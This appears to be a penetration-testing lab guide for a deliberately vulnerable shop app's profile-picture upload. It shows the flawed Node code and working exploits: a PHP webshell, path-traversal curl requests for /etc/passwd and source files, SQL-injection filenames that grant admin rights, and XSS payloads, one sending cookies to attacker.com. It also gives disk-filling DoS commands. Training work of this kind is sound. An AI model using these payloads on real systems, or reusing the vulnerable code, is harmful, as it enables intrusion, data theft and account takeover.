# File Upload Vulnerabilities - Profile Picture Upload

## 🎯 Feature Overview

**URL:** https://shopease.zevonai.com/profile  
**OWASP:** A01:2021 – Broken Access Control, A03:2021 – Injection, A04:2021 – Insecure Design  
**Severity:** CRITICAL

The profile picture upload feature contains multiple intentional vulnerabilities for penetration testing training.

---

## 🐛 Implemented Vulnerabilities

### 1. **No File Type Validation** ⚠️ CRITICAL

**Vulnerability:**
- No extension whitelisting
- No MIME type checking
- No magic number validation
- ANY file type can be uploaded (PHP, JSP, EXE, etc.)

**Vulnerable Code:**
```javascript
const upload = multer({
  storage: storage
  // MISSING: fileFilter function
});
```

**Exploitation:**
1. Navigate to `/profile`
2. Upload a PHP webshell:
```php
<?php system($_GET['cmd']); ?>
```
3. Save as `shell.php`
4. Access: `/uploads/shell.php?cmd=whoami`

**Impact:** Remote code execution if server misconfigured

---

### 2. **Insecure Filename Handling** ⚠️ HIGH

**Vulnerability:**
- Uses original filename without sanitization
- No character filtering
- Allows special characters

**Vulnerable Code:**
```javascript
filename: function (req, file, cb) {
  cb(null, file.originalname);  // Uses original name directly
}
```

**Exploitation:**

#### Test 1: Overwrite Existing Files
```bash
# Upload file named: ../../../etc/passwd
# Overwrites system files (if permissions allow)
```

#### Test 2: XSS via Filename
```html
<!-- Upload file named: <script>alert('XSS')</script>.jpg -->
```

#### Test 3: SQL Injection via Filename
```sql
-- Upload file named: test'; DROP TABLE users; --.jpg
```

**Impact:** File overwrite, XSS, SQL injection

---

### 3. **Path Traversal** ⚠️ CRITICAL

**Vulnerability:**
- No path sanitization
- Allows `../` sequences
- Can access files outside upload directory

**Vulnerable Code:**
```javascript
router.get('/uploads/:filename', (req, res) => {
  const filename = req.params.filename;
  const filepath = path.join(__dirname, '../public/uploads/', filename);
  res.sendFile(filepath);  // No validation
});
```

**Exploitation:**

```bash
# Access system files
curl https://shopease.zevonai.com/uploads/../../../../etc/passwd

# Access application files
curl https://shopease.zevonai.com/uploads/../../../server.js

# Access database config
curl https://shopease.zevonai.com/uploads/../../../db.js
```

**Impact:** Information disclosure, source code leak

---

### 4. **SQL Injection in Filename** ⚠️ HIGH

**Vulnerability:**
- Filename is directly concatenated into SQL
- No parameterized queries
- No input sanitization

**Vulnerable Code:**
```javascript
const query = `UPDATE users SET profile_picture = '${filename}' WHERE id = ${req.session.userId}`;
```

**Exploitation:**

Upload a file named:
```
test.jpg'; UPDATE users SET role='admin' WHERE email='attacker@test.com'; --
```

**Impact:** Database manipulation, privilege escalation

---

### 5. **No File Size Limit** ⚠️ MEDIUM

**Vulnerability:**
- No maximum file size restriction
- Can upload gigabyte-sized files

**Vulnerable Code:**
```javascript
const upload = multer({
  storage: storage
  // MISSING: limits: { fileSize: maxSize }
});
```

**Exploitation:**
```bash
# Upload 1GB file to fill disk
dd if=/dev/zero of=huge.jpg bs=1M count=1024
curl -X POST https://shopease.zevonai.com/profile/upload \
  -F "profile_picture=@huge.jpg" \
  -b "session_id=..."
```

**Impact:** Denial of Service, disk exhaustion

---

### 6. **Unrestricted File Access** ⚠️ HIGH

**Vulnerability:**
- Uploaded files accessible via direct URL
- No access control
- Anyone can view any uploaded file

**Exploitation:**
```bash
# Enumerate uploaded files
for i in {1..100}; do
  curl -I https://shopease.zevonai.com/uploads/user$i.jpg
done

# Download other users' files
curl https://shopease.zevonai.com/uploads/admin-passport.jpg -o stolen.jpg
```

**Impact:** Privacy breach, data leakage

---

### 7. **Information Disclosure - File Listing** ⚠️ MEDIUM

**Vulnerability:**
- Endpoint lists all uploaded files
- No user-specific filtering

**Vulnerable Code:**
```javascript
router.get('/profile/uploads', async (req, res) => {
  fs.readdir(uploadsDir, (err, files) => {
    // Shows ALL files, not just user's own
    res.render('uploads-list', { files });
  });
});
```

**Exploitation:**
```bash
# List all uploaded files
curl -b "session_id=..." https://shopease.zevonai.com/profile/uploads
```

**Impact:** Reconnaissance, privacy violation

---

### 8. **Reflected XSS in Success/Error Messages** ⚠️ MEDIUM

**Vulnerability:**
- Filename reflected in URL parameter without encoding
- Success/error messages rendered with `<%-` (unescaped)

**Vulnerable Code:**
```javascript
res.redirect(`/profile?success=Profile picture uploaded: ${filename}`);
```

**Exploitation:**

Upload file named:
```
<script>alert(document.cookie)</script>.jpg
```

Or directly visit:
```
https://shopease.zevonai.com/profile?success=<script>alert(1)</script>
```

**Impact:** Session hijacking, CSRF

---

### 9. **Vulnerable Dependency** ⚠️ HIGH

**Vulnerability:**
- Uses multer 1.4.2 with known CVE-2022-24434
- Allows prototype pollution

**Evidence:**
```bash
docker compose exec app npm audit | grep multer
```

**Impact:** Prototype pollution attack, DoS

---

## 🧪 Complete Exploitation Guide

### Test 1: Upload PHP Webshell

**Steps:**
1. Login to https://shopease.zevonai.com/login
2. Navigate to `/profile`
3. Create `shell.php`:
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
4. Upload via profile picture form
5. Access: `/uploads/shell.php?cmd=ls -la`

---

### Test 2: Path Traversal

**Burp Suite Method:**
1. Intercept upload request
2. Modify filename parameter:
```
Content-Disposition: form-data; name="profile_picture"; filename="../../../etc/passwd"
```
3. Forward request
4. Access: `/uploads/../../../etc/passwd`

**curl Method:**
```bash
curl -X POST https://shopease.zevonai.com/profile/upload \
  -F "profile_picture=@test.txt;filename=../../../test.txt" \
  -b "session_id=YOUR_SESSION"
```

---

### Test 3: Malicious File Types

**Upload These:**

#### 1. HTML with JavaScript
```html
<html>
<body>
<script>
  alert('XSS via uploaded HTML');
  fetch('https://attacker.com?cookie=' + document.cookie);
</script>
</body>
</html>
```
Save as: `malicious.html`

#### 2. SVG with Embedded JavaScript
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40"/>
</svg>
```
Save as: `malicious.svg`

#### 3. Executable
```bash
# Upload .exe, .sh, .bat files
# Test if server executes them
```

---

### Test 4: SQL Injection via Filename

**Using Burp Suite:**
1. Intercept profile picture upload
2. Change filename to:
```
test.jpg'; UPDATE users SET password='hacked123' WHERE email='victim@test.com'; --
```
3. Forward request
4. Check if SQL executed

---

### Test 5: DoS via Large File

```bash
# Create 100MB file
dd if=/dev/zero of=large.jpg bs=1M count=100

# Upload
curl -X POST https://shopease.zevonai.com/profile/upload \
  -F "profile_picture=@large.jpg" \
  -b "session_id=..."
```

---

## 📊 Vulnerability Summary Table

| Vulnerability | OWASP | Severity | Exploitability | Impact |
|--------------|-------|----------|----------------|--------|
| No File Type Validation | A04 | CRITICAL | Easy | RCE |
| Unrestricted Filename | A03 | HIGH | Easy | XSS, SQLi, File Overwrite |
| Path Traversal | A01 | CRITICAL | Easy | Info Disclosure |
| SQL Injection (Filename) | A03 | HIGH | Medium | DB Manipulation |
| No Size Limit | A04 | MEDIUM | Easy | DoS |
| Unrestricted Access | A01 | HIGH | Easy | Privacy Breach |
| File Listing Disclosure | A01 | MEDIUM | Easy | Reconnaissance |
| Reflected XSS | A03 | MEDIUM | Easy | Session Hijacking |
| CVE-2022-24434 (multer) | A06 | HIGH | Medium | Prototype Pollution |

---

## 🎓 Teaching Points for Mentor

### Key Concepts

1. **Defense in Depth:** File uploads need multiple layers of validation
2. **Client-side validation is useless:** Easily bypassed via Burp/curl
3. **Whitelist > Blacklist:** Whitelist extensions, don't blacklist dangerous ones
4. **MIME type != Security:** Content-Type header is user-controlled
5. **Magic numbers:** Check file signature (first few bytes)
6. **Randomize filenames:** Never use user-supplied names
7. **Isolate uploads:** Store outside webroot, serve via script
8. **Access control:** Verify ownership before serving files

---

## 🛡️ Secure Implementation Reference

**What a SECURE upload should have:**

```javascript
// 1. Whitelist extensions
const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];

// 2. Check MIME type
const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];

// 3. Limit file size
limits: { fileSize: 5 * 1024 * 1024 } // 5MB

// 4. Random filename
const filename = crypto.randomBytes(16).toString('hex') + '.jpg';

// 5. Verify magic numbers (file signature)
// 6. Scan for malware
// 7. Store outside webroot
// 8. Serve with Content-Disposition: attachment
// 9. Use parameterized SQL queries
// 10. Sanitize all file metadata
```

---

## ✅ Testing Checklist

**Quick Tests:**
- [ ] Upload `.php` file - accepted
- [ ] Upload `.exe` file - accepted
- [ ] Upload 100MB+ file - accepted
- [ ] Upload filename with `../` - path traversal works
- [ ] Upload filename with `<script>` - XSS in success message
- [ ] Upload filename with SQL syntax - injection possible
- [ ] Access `/uploads/../../../etc/passwd` - file accessible
- [ ] Visit `/profile/uploads` - lists all files
- [ ] Upload as User A, access as User B - no access control
- [ ] `npm audit` shows multer CVE - confirmed

---

## 🔗 Related Attack Chains

**Chain 1: File Upload → RCE**
1. Upload PHP webshell
2. Execute system commands
3. Download database backup
4. Extract all user passwords

**Chain 2: File Upload → XSS → Session Hijack**
1. Upload HTML file with JS
2. Share link to victim
3. Steal session cookie
4. Take over admin account

**Chain 3: File Upload → SQLi → Privilege Escalation**
1. Upload file with SQLi in name
2. Inject: `SET role='admin'`
3. Gain admin access
4. Access admin panel

---

**Feature URL:** https://shopease.zevonai.com/profile  
**Last Updated:** July 16, 2026  
**Status:** ✅ DEPLOYED TO PRODUCTION

**Access:** Login required (any user account)
